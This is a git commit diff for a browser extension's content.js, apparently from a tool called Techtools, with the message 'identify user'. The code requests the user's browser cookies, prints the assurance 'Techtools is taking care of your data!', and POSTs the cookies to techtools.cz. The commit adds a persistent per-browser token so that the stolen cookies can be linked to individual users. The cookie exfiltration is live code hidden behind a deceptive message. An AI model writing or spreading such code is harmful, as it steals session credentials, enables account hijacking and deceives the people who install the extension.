b9f77edc27c99c18cb459d58479c0f0aa206fc8c
Jiří Novák <63288402+TaraJura@users.noreply.github.com>
2024-02-24 23:54:17 +0100

    identify user

--- content.js
+++ content.js
@@ -1,25 +1,39 @@
+// Function to generate a unique token
+function generateToken() {
+  return 'user_' + Math.random().toString(36).substr(2) + Date.now().toString(36);
+}
+
 chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
   console.log('Techtools is taking care of your data!');
 
-  // Send data to the the processing server
-  fetch('https://techtools.cz/extension/receiver', {
-    method: 'POST', // Specify the method
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      "cookies": response.cookies
-    })
-  })
-  .then(response => {
-    // Check if the response is ok and has content
-    if (!response.ok) throw new Error('Network response was not ok');
-    if (response.headers.get("content-type") && response.headers.get("content-type").toLowerCase().indexOf("application/json") !== -1) {
-      return response.json();
-    } else {
-      throw new Error('Response was not JSON');
+  // Check for an existing token
+  chrome.storage.local.get(['userToken'], function(result) {
+    let userToken = result.userToken;
+
+    if (!userToken) {
+      // If token doesn't exist, generate and save a new one
+      userToken = generateToken();
+      chrome.storage.local.set({userToken: userToken}, function() {
+        console.log("New token generated and saved.");
+      });
     }
-  })
-  .then(data => console.log(data)) // Handling the data from the response
-  .catch(error => console.error('Error:', error)); // Handling errors  
+
+    // Now that we have a token, send the data with the token
+    fetch('https://techtools.cz/extension/receiver', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        "cookies": response.cookies,
+        "user_identifier": userToken // Include the token in the request
+      })
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok');
+      return response.json();
+    })
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
+  });
 });
